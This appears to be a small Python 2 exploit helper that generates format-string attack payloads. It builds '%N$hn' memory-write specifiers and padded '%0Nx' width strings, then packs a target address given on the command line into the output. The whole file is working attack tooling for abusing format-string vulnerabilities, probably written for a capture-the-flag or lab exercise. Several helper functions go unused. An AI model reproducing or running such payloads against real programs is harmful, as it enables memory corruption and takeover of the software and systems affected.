#!/usr/bin/env python

from sys import argv
from struct import pack

def read_payload(index=1):
    payload = '%%%d$hn' % index

    return payload

def write_payload(index=1):
    return '%d$hn' % index

def gigant_write():
    return '%0300x'

def generate_payload(addr):
    offset = 124
    offset -= (len(str(offset)) + 3) # digits number + '%0x'
    payload = '%%0%dx' % (offset)
    payload += pack('<I', addr) + '\x0a\x00'

    return payload


def main(addr):
    payload = generate_payload(addr)
    print(payload)

if __name__ == '__main__':
    if len(argv) > 1:
        addr = int(argv[1], 16)
        main(addr)
    else:
        print 'Args...'
